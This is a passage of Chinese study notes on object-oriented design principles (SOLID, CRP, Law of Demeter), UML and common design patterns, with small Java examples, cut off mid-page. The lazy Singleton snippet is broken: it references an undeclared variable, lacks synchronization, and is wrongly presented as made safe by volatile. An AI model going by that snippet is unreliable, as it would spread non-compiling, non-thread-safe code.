title=\"设计模式的弊端\"></a>设计模式的弊端</h2><ul>\n<li>权衡：设计模式有可能会很复杂</li>\n<li>没有经验的用户可能会使用比实际需要更多的设计模式<ul>\n<li>你应当试图提醒自己为什么要用设计模式，模式是一个工具，使用模式，而不是模式使用你！</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"设计模式的种类\"><a href=\"#设计模式的种类\" class=\"headerlink\" title=\"设计模式的种类\"></a>设计模式的种类</h2><ul>\n<li>分析</li>\n<li>设计</li>\n<li>组织</li>\n<li>过程</li>\n<li>项目计划</li>\n<li>配置管理</li>\n</ul>\n<p>Types Of Software Patterns<br>n Riehle and Zullighoven in “Understanding and Using<br>Patterns in Software Development” mention three types<br>of software patterns. q Conceptual Pattern<br>n Pattern whose form is described by means of terms and<br>concepts from the application domain<br>q Design Pattern<br>n Pattern whose form is described by means of software design<br>constructs, such as objects, classes, inheritance and<br>aggregation<br>q Programming Pattern (Programming Idiom)<br>n Pattern whose form is described by means of programming<br>language constructs</p>\n<h2 id=\"三种模式类型\"><a href=\"#三种模式类型\" class=\"headerlink\" title=\"三种模式类型\"></a>三种模式类型</h2><ul>\n<li><p>Creational Patterns 创建型</p>\n<ul>\n<li>Abstract Factory (抽象工厂)</li>\n<li>Builder (建造者)</li>\n<li>Factory Method (工厂方法)</li>\n<li>Singleton (单例)</li>\n<li>Prototype (原型)</li>\n</ul>\n</li>\n<li><p>Structural Patterns 结构型</p>\n<ul>\n<li>Adapter (适配器)</li>\n<li>Bridge (桥接)</li>\n<li>Composite (合成)</li>\n<li>Decorator (装饰器)</li>\n<li>Facade (门面)</li>\n<li>Flyweight (享元)</li>\n<li>Proxy (代理)</li>\n</ul>\n</li>\n<li><p>Behavioral Patterns 行为型</p>\n<ul>\n<li>Chain of Responsibility (责任链)</li>\n<li>Command (命令)</li>\n<li>Interpreter (解释器)</li>\n<li>Iterator (迭代器)</li>\n<li>Mediator (中介者)</li>\n<li>Memento (备忘录)</li>\n<li>Observer (观察者)</li>\n<li>State (状态)</li>\n<li>Strategy (策略)</li>\n<li>Template Method (模板方法)</li>\n<li>Visitor (访问者)</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"UML\"><a href=\"#UML\" class=\"headerlink\" title=\"UML\"></a>UML</h1><p>统一建模语言UML(Unified Modeling Language)是一个软件工程行业中，需求普遍的的开发这建模语言，用来提供一种标准的来虚拟化系统设计的方法。</p>\n<h2 id=\"类图-Class-Diagram-是一种静态的结构化图表，通过展现系统的类，变量，方法来描述系统的结构和对象之间的关系\"><a href=\"#类图-Class-Diagram-是一种静态的结构化图表，通过展现系统的类，变量，方法来描述系统的结构和对象之间的关系\" class=\"headerlink\" title=\"类图(Class Diagram)是一种静态的结构化图表，通过展现系统的类，变量，方法来描述系统的结构和对象之间的关系\"></a>类图(Class Diagram)是一种静态的结构化图表，通过展现系统的类，变量，方法来描述系统的结构和对象之间的关系</h2><p>画类图:<br>三个矩形,上中下分别写类名,成员变量,方法名,如果是抽象类,则类名需要用斜体表示,静态的成员变量和方法需要加上下划线</p>\n<p>继承使用空三角箭头实线,接口使用<code>&lt;&lt;interface&gt;&gt;</code>标识,接口实现类使用空心三角虚线</p>\n<p>聚合表示不是一定具有的关系,用空心箭头,组合是强关系,一方依赖一方存在,用实心箭头</p>\n<p>成员方法中,+-#~分别表示公有,私有,保护,默认/友元</p>\n<p>一切类之间的其他关系用普通箭头表示(uses…creates….notifies….)</p>\n<h2 id=\"时序图\"><a href=\"#时序图\" class=\"headerlink\" title=\"时序图\"></a>时序图</h2><p>时序图是一个展示对象按照何种顺序一个一个操作的交互图,展现了对象在时间序列中如何交互</p>\n<h1 id=\"面向对象准则\"><a href=\"#面向对象准则\" class=\"headerlink\" title=\"面向对象准则\"></a>面向对象准则</h1><p>面向对象设计的7大准则</p>\n<ul>\n<li>SRP: Single Responsibility Principle 单一职责原则</li>\n<li>OCP: Open-Closed Principle 开放-封闭原则</li>\n<li>LSP: Liskov Substitution Principle 里氏替换原则</li>\n<li>ISP: Interface Segregation Principle 接口分离原则</li>\n<li>DIP: Dependence Inversion Principle 依赖倒置原则</li>\n<li>CRP: Composite/Aggregate Reuse Principle 组合/聚合复用原则</li>\n<li>PLK: Principle of Least Knowledge 最小知识原则</li>\n</ul>\n<p>SOLID表示前5个设计原则,目的是让软件设计更加易于理解,灵活和可维护</p>\n<p>面向对象设计的7大致命错误</p>\n<ul>\n<li>Rigidity (僵化) – make it hard to change</li>\n<li>Fragility (脆弱) – make it easy to break</li>\n<li>Immobility (固化) – make it hard to reuse</li>\n<li>Viscosity (黏滞) – make it hard to do the rightthing</li>\n<li>Needless Complexity (非必要复杂性) – over design</li>\n<li>Needless Repetition (非必要重复) – error prone</li>\n<li>Not doing any design</li>\n</ul>\n<h2 id=\"SRP\"><a href=\"#SRP\" class=\"headerlink\" title=\"SRP\"></a>SRP</h2><blockquote>\n<p>Single Responsibility Principle</p>\n</blockquote>\n<p>从软件变化的角度来看，就一个而言，应该仅有一个让他发生变化的原因。单一职责原则及内聚性（Cohesion），表示一个模块的组成元素之间的功能相关性。</p>\n<p>单一职责意味着内聚性的上升，多职责意味着耦合性上升，会导致复用性下降</p>\n<h2 id=\"OCP\"><a href=\"#OCP\" class=\"headerlink\" title=\"OCP\"></a>OCP</h2><blockquote>\n<p>Open Closed Principle</p>\n</blockquote>\n<p>软件实体（类，模块，方法等）应该开放扩展，但应关闭修改。</p>\n<ul>\n<li>开放扩展：满足增加新模块的需求</li>\n<li>关闭修改：不需要且不能够修改当前模块来满足新的需求</li>\n</ul>\n<p>基于已经存在的系统，软件来提供新方法来满足需求，应次软件有很强的适应性和灵活性。已存在的模块，尤其是最重要的那些抽象模块（已经被仔细测试过的），不需要再被修改，因此软件有很强的稳定性和持久性。</p>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>依赖抽象，多态，继承，接口</p>\n<p>抽象是指抽象类和接口，他们是固定的但是有很多可能的行为，行为由继承/实现了他们的子类去完成。接口是预定义的，所以不能够被修改。接口开放扩展，因为他有灵活的继承者数量。修改接口会给他的子类继承者带来级联的改变。 </p>\n<p>例子：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GraphicEditor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">drawShape</span><span class=\"params\">(Shape s)</span> </span>&#123;</span><br><span class=\"line\">        s.draw();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shape</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title\">draw</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Rectangle</span> <span class=\"keyword\">extends</span> <span class=\"title\">Shape</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">draw</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// draw the rectangle</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;   </span><br></pre></td></tr></table></figure><br>可以新增图形继承<code>Shape</code>类，实现<code>draw()</code>方法，每次调用该方法都对对应相对的实现方法。</p>\n<p>OCP不能总被完全满足，总有一些功能扩展不能在不修改代码的基础上实现。OCP应该在合理的范围内被使用，设计者应该预测到模块潜在的变化，之后建立相应的抽象类来实现他们。</p>\n<p>OCP是面向对象设计的核心，抽象是OCP的核心，OCP意味着更好的复用和可维护性。过分使用OCP也是个坏主意，我们应该把那些经常变化的类抽象，同时也要避免无意义的抽象。不可能所有系统模块满足OCP，但是我们应该让不满足OCP的模块最小化。</p>\n<h2 id=\"LSP\"><a href=\"#LSP\" class=\"headerlink\" title=\"LSP\"></a>LSP</h2><blockquote>\n<p>Liskov Substitution Principle(里氏替换原则)</p>\n</blockquote>\n<p>任何基类可以出现的地方，子类一定可以出现。</p>\n<p>所有的派生类遵从满足他们基类的行为。当一个子类的实例应该能够替换任何其超类的实例时，它们之间才具有is-A关系。</p>\n<p>里氏替换原则只是提出了一个问题，但没有给出解决方案。解决方案：契约式设计(Dedign by Contract)</p>\n<ul>\n<li>Pre-conditions<ul>\n<li>每个方法调用之前，该方法应该校验传入参数的正确性，只有正确才能执行该方法，否则认为调用方违反契约，不予执行。这称为前置条件。</li>\n</ul>\n</li>\n<li>Post-conditions<ul>\n<li>一旦通过前置条件的校验，方法必须执行，并且必须确保执行结果符合契约，这称之为后置条件。</li>\n</ul>\n</li>\n<li>Invariant<ul>\n<li>对象本身有一套对自身状态进行校验的检查条件，以确保该对象的本质不发生改变，这称之为不变式。</li>\n</ul>\n</li>\n</ul>\n<p>比如正方形不能替代矩形，所以不能让正方形继承矩形，那么正方形就必须也有<code>setWidth()</code>和<code>setHeight()</code>的方法，而应该让正方形和矩形一起继承四边形。</p>\n<p>LSP的解决方法：</p>\n<ul>\n<li>可以让两个不能代替的类继承一个抽象类</li>\n<li>可以让一个类持有一个类（聚合关系）</li>\n</ul>\n<p>LSP是使用继承的准则，LSP是理论主义和严格的，有时打破SP一点是合理的且有益的，无论如何，在设计继承关系时，LSP是需要考虑的。</p>\n<h2 id=\"ISP\"><a href=\"#ISP\" class=\"headerlink\" title=\"ISP\"></a>ISP</h2><blockquote>\n<p>Interface Sepregation Principle 接口分离原则</p>\n</blockquote>\n<p>ISP就是SRP的接口版本，一个类对另一个类的依赖关系应该取决于最小的接口</p>\n<p>接口应当是细粒度的，内聚的，大的接口会导致接口污染，减少接口的数量不能减少代码量，只能污染接口;接口应该尽可能小，甚至接口中没有方法定义都是合理的。</p>\n<h2 id=\"DIP\"><a href=\"#DIP\" class=\"headerlink\" title=\"DIP\"></a>DIP</h2><blockquote>\n<p>Dependence Inversion Principle (Hollywood Principle)依赖倒置原则</p>\n</blockquote>\n<p><strong>Don’t calln us,we’ll call you</strong></p>\n<p>高层模块不应该依赖于低层模决，二者都应该依赖于抽象。进一步的，抽象不应该依赖于细<br>节，细节应该依赖于抽象。</p>\n<p>Bad example:<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Hunter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">take</span><span class=\"params\">(Axe axe)</span></span>&#123;&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">take</span><span class=\"params\">(Gun gun)</span></span>&#123;&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">take</span><span class=\"params\">(Knife knife)</span></span>&#123;&#125;;</span><br><span class=\"line\">    ....</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Axe</span>() </span>&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>Good Example:依赖一个抽象的类<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Player</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">take</span><span class=\"params\">(Weapon w)</span></span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Hunter</span> <span class=\"keyword\">extends</span> <span class=\"title\">Player</span></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Axe</span> <span class=\"keyword\">extends</span> <span class=\"title\">Weapon</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>提升灵活性，可测试性，可维护性，降低僵化</p>\n<p>高层为一个服务指定一个抽象接口，底层去实现这个接口，高层通过接口使用实现了他的底层的类的方法，所以高层不依赖于底层。相反，底层愈来愈高层指定的接口。依赖关系倒置。</p>\n<p>DIP原则：</p>\n<ul>\n<li>任何变量不应该有一个指向具体类的引用，而应该有一个指向抽象类的引用。</li>\n<li>任何类不能继承一个具体类</li>\n<li>任何方法不能重写基类中基本的方法</li>\n<li>DIP是过分严格的</li>\n</ul>\n<p>DIP是用来解耦的，用于类不稳定时，DIP的目的是经常使用接口而不是具体类</p>\n<p>共享的代码应该被放到抽象层的抽象类中，私有数据应该被移到具体类</p>\n<h2 id=\"CRP\"><a href=\"#CRP\" class=\"headerlink\" title=\"CRP\"></a>CRP</h2><blockquote>\n<p>Composite/Aggregate Reuse Principle</p>\n</blockquote>\n<p>多用组合，少用继承。组合/聚合复用原则就是在一个新的对象里面使用一些已有的对象，使之成为新对象的一部分；新的对象通过向这些对象的委派达到复用已有功能的目的。</p>\n<p>比如父类中增减字段会导致所有子类需要重写。可以让子类继承接口，父类有接口的一个句柄。</p>\n<p>聚合是一个has a的关系，组合是全体局部的关系。</p>\n<p>组合聚合是黑盒复用，被包含者的内部不可见。继承是白盒复用，强耦合，被继承者内部可见。</p>\n<p><strong>!重新看第三章PPT设计原则</strong></p>\n<h2 id=\"Observer-观察者\"><a href=\"#Observer-观察者\" class=\"headerlink\" title=\"Observer(观察者)\"></a>Observer(观察者)</h2><p>观察者是一种<strong>行为模式</strong></p>\n<h2 id=\"概述-1\"><a href=\"#概述-1\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>例子：当宝宝哭，爸爸必须立刻查看宝宝：<br>一种实现方式：Father使用while忙等待，坚挺宝宝的status是否为哭，但这样会浪费大量的资源；如果要增加宝宝的数量，就需要修改Father的代码，增加每次循环中判断的次数；如果增加一个妈妈，又会增加重复的代码。为了实现监听对象的状态的变化，映入观察者模式：此例中Baby是对象(Subject)，妈妈爸爸是观察者(Observer)。</p>\n<p><img src=\"Screenshot_20181108_190812.png\" alt=\"\"></p>\n<p>Subject是一个接口，所有被观察者实现它，被观察者的实例中包含一个存储observer的容器，用<code>registerObserver()</code>,<code>removeObserver()</code>来维护容器中的observer句柄的增删。<code>notifyObservers()</code>则遍历容器，调用容器中每个对象的<code>update()</code>方法，一般来说<code>update()</code>中传入this指针。一般来说这三个方法写作<code>attach()</code>，<code>detach()</code>，<code>notify()</code>。</p>\n<h3 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h3><p>同样所有观察者只需要实现observer接口，相互依赖的两者都各自抽象，做到了松耦合。<br>每个观察者都可以成为容器里的一个元素，实现了一个对象对应多个观察者，无需修改代码即可增删观察者。只需要观察者实现update的操作，而被观察者无需知道观察者的具体类型；观察者和被关查者可以属于不同的抽象层。同时事件得以广播，观察者可以在任何时间被增删。</p>\n<h3 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h3><ul>\n<li>观察者之间感受不到互相的存在，他们对改变subject带来的影响可能是盲目的</li>\n<li>一个观察者对Subject的人畜无害的改变可能带来灾难性的后果</li>\n</ul>\n<h3 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h3><p>观察者模式又称publish-subscribe(发布订阅)，awt和一些框架(MVC)，事件监听器，都用到了观察者模式。</p>\n<h3 id=\"Java内建Observer\"><a href=\"#Java内建Observer\" class=\"headerlink\" title=\"Java内建Observer\"></a>Java内建Observer</h3><p>observable作为一个类让Subject继承，观察者需要实现Observer接口。<br>要注意调用了<code>setChanged()</code>之后，<code>notifyObservers()</code>才有用</p>\n<h2 id=\"Strategy-策略\"><a href=\"#Strategy-策略\" class=\"headerlink\" title=\"Strategy(策略)\"></a>Strategy(策略)</h2><p>把可能变化的代码独立出来，不要和不变化的代码混在一起。<br><img src=\"Screenshot_20181112_175832.png\" alt=\"\"><br>针对接口编程，而不是针对实现编程。这种做法体现了依赖倒置原则，体现了少用继承的观点。通过持有接口，增加了模块的灵活性，让你可以在运行时改变行为。</p>\n<p>针对一组算法，将每一个算法封装到具有共同接口的独立的类中，从而使得它们可以相互替换。策略模式使得算法可以在不影响到客户端的情况下发生变化。客户决定使用哪个算法。</p>\n<p>每个类由于自己的角色决定了他们不同的行为，策略模式提供了一种改变他们行为的方法。这种方式可以有效减少if语句的使用，让一些可替代的模块更具可扩展性和可重用性。</p>\n<p>但是这种模式也导致了客户使用难度的上升和对象的数目的增加。</p>\n<h3 id=\"awt中的体现\"><a href=\"#awt中的体现\" class=\"headerlink\" title=\"awt中的体现\"></a>awt中的体现</h3><p><img src=\"Screenshot_20181112_180835.png\" alt=\"\"></p>\n<h2 id=\"Factory-Method-工厂方法\"><a href=\"#Factory-Method-工厂方法\" class=\"headerlink\" title=\"Factory Method(工厂方法)\"></a>Factory Method(工厂方法)</h2><p>工厂方法是一种<strong>创建模式</strong>，用来解决不同子类的创建耦合的情况。<br>例：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (picnic) &#123;</span><br><span class=\"line\">    duck = <span class=\"keyword\">new</span> MallardDuck();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (hunting) &#123;</span><br><span class=\"line\">    duck = <span class=\"keyword\">new</span> DecoyDuck();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (inBathTub) &#123;</span><br><span class=\"line\">    duck = <span class=\"keyword\">new</span> RubberDuck();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>定义一个接口来创建对象，但是让子类决定哪个类来实例化。<br><img src=\"Screenshot_20181112_183052.png\" alt=\"\"></p>\n<p>所有的new操作都被放到一个<code>FactoryMethod()</code>里，集中返回不同的Product实例</p>\n<h2 id=\"Abstract-Factory-抽象工厂\"><a href=\"#Abstract-Factory-抽象工厂\" class=\"headerlink\" title=\"Abstract Factory(抽象工厂)\"></a>Abstract Factory(抽象工厂)</h2><p>笔记本上补图！</p>\n<h3 id=\"Decorator-装饰器-？重看\"><a href=\"#Decorator-装饰器-？重看\" class=\"headerlink\" title=\"Decorator(装饰器)？重看\"></a>Decorator(装饰器)？重看</h3><p>装饰器是一种<strong>结构模式</strong><br>当类中的属性经常变化时，要遵循可添加不可修改的原则。</p>\n<p><img src=\"Screenshot_20181115_152125.png\" alt=\"\"></p>\n<p>当给一个对象动态添加指责而不影响其他的时候，当继承会影响其他部分很不现实的时候，可采用装饰器。</p>\n<h3 id=\"实现-1\"><a href=\"#实现-1\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>使用聚合，让新的类中包含原有的类，从而新类中可以调用旧类的行为。使用聚合而不使用继承，防止了子类爆炸，基类改变带来子类的修改！体现了CRP的原则。例子：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Component component = <span class=\"keyword\">new</span> DecoratorC(<span class=\"keyword\">new</span> DecorationB(<span class=\"keyword\">new</span> DecoratorA()));</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"java中的IO\"><a href=\"#java中的IO\" class=\"headerlink\" title=\"java中的IO\"></a>java中的IO</h3><p>java中的IO就体现了这一设计模式，Writer,Reader类都是基于InputStream,OutputStream的封装，Stream用来做字节流处理，Writer/Reader做字符处理(java字符是unicode),例子<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">new BufferedReader(new FileReader(new FileInputStream(new File(&quot;file&quot;))))</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Singleton-单例\"><a href=\"#Singleton-单例\" class=\"headerlink\" title=\"Singleton(单例)\"></a>Singleton(单例)</h2><p>很多对象都只需要一个，例如线程池，缓存，对话框，处理注册表和配置的类，用于登陆的类，类似显卡打印机的类。</p>\n<p>单例子模式同样可以扩展，允许若干个类的实例。单例模式比静态更灵活，更易扩展，静态类不能有状态，而单例的类可以有状态。</p>\n<h3 id=\"饿汉模式\"><a href=\"#饿汉模式\" class=\"headerlink\" title=\"饿汉模式\"></a>饿汉模式</h3><p>程序启动时，类被实例化，线程安全。<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Singleton instance = <span class=\"keyword\">new</span> Singleton();</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstane</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"懒汉模式\"><a href=\"#懒汉模式\" class=\"headerlink\" title=\"懒汉模式\"></a>懒汉模式</h3><p>线程不安全，多线程访问时可能得到多个Singleton对象，(即每个线程有自己的单例对象)<br>改进：volatile关键字<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">static</span> Singleton instance;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Singleton</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title\">getInstane</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(singleton == <span class=\"keyword\">null</span>) </span><br><span class=\"line\">            singleton = <span class=\"keyword\">new</span> Singleton();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Command-Behavioral-命令模式\"><a href=\"#Command-Behavioral-命令模式\" class=\"headerlink\" title=\"Command Behavioral(命令模式)\"></a>Command Behavioral(命令模式)</h2><p>命令模式把一个请求封装到一个对象中。命令模式允许系统使用不同的请求把客户端参数化，对请求排队或者记录请求日志，可以提供命令的撤销和恢复功能。（Action,Transaction）</p>\n<p>比如在一套用户界面工具箱里，按钮点击需要触发事件，但是事件是什么则需要对应的应用程序来实现。当行为被参数化为一个对象，你可以用一个回调函数来表达这种参数化，那就是，函数在某处被注册并在将来被返回。命令模式是回调的面向对象实现。</p>\n<h3 id=\"支持撤回\"><a href=\"#支持撤回\" class=\"headerlink\" title=\"支持撤回\"></a>支持撤回</h3><p>命令对象执行的操作可以讲上次对象的状态存在命令对象中，来消除命令执行带来的影响。命令对象可以存在一个List容器中，实现连续的撤回和取消撤回。(Undo and Redo)</p>\n<h3 id=\"支持记录变化\"><a href=\"#支持记录变化\" class=\"headerlink\" title=\"支持记录变化\"></a>支持记录变化</h3><p>通过添加<code>Load()</code>，<code>Store()</code>两个操作，可以持久记录变化，他们可以在系统崩溃后用来恢复。</p>\n<h3 id=\"支持事务-transaction\"><a href=\"#支持事务-transaction\" class=\"headerlink\" title=\"支持事务(transaction)\"></a>支持事务(transaction)</h3><ul>\n<li>一个系统的高级操作基本都是建立在底层操作上</li>\n<li>一个事务封装了对数据的一系列操作</li>\n<li>命令模式有共同接口，可以想调用事务一样调用命令</li>\n</ul>\n<ul>\n<li>命令模式把发送命令和执行命令的指责分开来，吧命令对象对托给不同的对象</li>\n<li>每个命令都是一个对象<br><img src=\"Screenshot_20181120_164007.png\" alt=\"\"></li>\n</ul>\n<p>Command decouples the object that invokes<br>the operation from the one that knows how to<br>perform it. n You can assemble commands into a<br>composite command (Composite pattern). n It’s easy to add new Commands, because<br>you don’t have to change existing classes. n It is easy to implement Undo and Redo.<br><img src=\"Screenshot_20181120_170503.png\" alt=\"\"></p>\n<h3 id=\"宏命令-macro-command\"><a href=\"#宏命令-macro-command\" class=\"headerlink\" title=\"宏命令(macro command)\"></a>宏命令(macro command)</h3><p>一堆命令变为一个命令：新建一个命令对象，其中包含一个拥有多个命令对象的容器，每次对象被触发时，则调用容器中所有对象的触发方法。</p>\n<p>应用：调度器，线程池，任务队列</p>\n<h2 id=\"适配器-Adapter\"><a href=\"#适配器-Adapter\" class=\"headerlink\" title=\"适配器(Adapter)\"></a>适配器(Adapter)</h2><p>你需要在现有系统上使用一个新系统，但是新系统和现有的系统不能适配，于是需要增加（OpenClose原则）一个新的模块来适配。</p>\n<p>适配时转化调用者的请求，使得能被新模块识别。适配器对被调用者和调用者是透明的，两者感觉不到请求被人处理。适配器使得原本因为接口不同不能工作的类能够一起使用。</p>\n<h3 id=\"实现-2\"><a href=\"#实现-2\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>具体实现两种方式：</p>\n<ul>\n<li>类适配器（继承）<br><img src=\"Screenshot_20181119_153348.png\" alt=\"\"><br>java不能实现，因为不能多继承</li>\n<li>对象适配器（聚合）<br><img src=\"Screenshot_20181119_153438.png\" alt=\"\"><br>适合增加方法，但不适合修改</li>\n</ul>\n<h3 id=\"几个原则\"><a href=\"#几个原则\" class=\"headerlink\" title=\"几个原则\"></a>几个原则</h3><ul>\n<li>适配器可以重写一些被适配者的方法</li>\n<li>当要给一个类和他的所有子类适配，适配器不起作用</li>\n<li>引入一个只有一个实例的适配类，就只有一种方式让客户访问到被适配的类。</li>\n<li>一个适配器不能和多个被适配者一起使用</li>\n</ul>\n<h3 id=\"实际生活中的适配器-枚举和迭代\"><a href=\"#实际生活中的适配器-枚举和迭代\" class=\"headerlink\" title=\"实际生活中的适配器:枚举和迭代\"></a>实际生活中的适配器:枚举和迭代</h3><p>早期的容器实现了一个<code>elements()</code>方法，返回一个枚举类，我们先让所有容器都支持Iterator，于是可以使用一个适配器。<br><img src=\"Screenshot_20181120_134710.png\" alt=\"\"></p>\n<h2 id=\"门面（Facade-Pattern）\"><a href=\"#门面（Facade-Pattern）\" class=\"headerlink\" title=\"门面（Facade Pattern）\"></a>门面（Facade Pattern）</h2><p>Facade不是一个具体的设计模式，更像diligent架构模式。减少接口太多的问题，使得暴露的接口尽可能少。</p>\n<p>当一个行为中包含了对多个模块的调用时，创造一个封装这些多个调用的方法。使得子系统易于使用易于理解。</p>\n<p>例子：家庭影院 电影开始 = {关灯，打开电视，播放….}</p>\n<h3 id=\"动机\"><a href=\"#动机\" class=\"headerlink\" title=\"动机\"></a>动机</h3><ul>\n<li>当系统太复杂，则需要一个子系统来减少复杂性<br>PPT 12 - 12</li>\n</ul>\n<h3 id=\"设计准则\"><a href=\"#设计准则\" class=\"headerlink\" title=\"设计准则\"></a>设计准则</h3><p>Principle of Least Knowledge (Law of Demeter)</p>\n<ul>\n<li>talk only to your immediate friends</li>\n</ul>\n<h3 id=\"Implement-Issus\"><a href=\"#Implement-Issus\" class=\"headerlink\" title=\"Implement Issus\"></a>Implement Issus</h3><ul>\n<li>一般来说，一个系统只有一个门面，但是在一些情况下，多个门面也要被考虑。</li>\n<li>不要给门面增加新的行为</li>\n<li>让门面成为一个有具体子类的抽象类来对于子系统有不同实现。这样的抽象耦合使得客户端不知道哪种子系统被使用，使得客户端和子系统解耦。</li>\n</ul>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>从客户角度来看，Facade模式不仅简化了整个组件系统的接口，同时对于内部组件与外部<br>客户程序来说，从某种程度上也达到了一种“解耦”的效果，子系统内部任何变化不会影响到Facade接口的变化。 </li>\n<li>Facade对应的组件应该是“相互耦合关系比较大”的一系列组件，而不是一个简单功能的集合。</li>\n<li>Facade模式更注重从架构的层次去看整个系统，而不是单个类的层次。Facade更多是一<br>种架构设计模式</li>\n<li>Facade注重简化接口；Adapter注重转换接口；Decorater注重稳定接口的前提下为对象扩展功能。</li>\n</ul>\n<h2 id=\"模板方法-Template-Method\"><a href=\"#模板方法-Template-Method\" class=\"headerlink\" title=\"模板方法(Template Method)*\"></a>模板方法(Template Method)*</h2><p>模板方法是一种行为模式。</p>\n<p>准备一个抽象类，将部分逻辑以具体方法以及具体构造子的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现。</p>\n<p>类似框架，固定了架构，具体实现由开发者决定。（FrameWork半完成软件）<br><img src=\"Screenshot_20181122_224638.png\" alt=\"\"></p>\n<p>例子：springboot，httpServlet</p>\n<h2 id=\"迭代器-Iterator\"><a href=\"#迭代器-Iterator\" class=\"headerlink\" 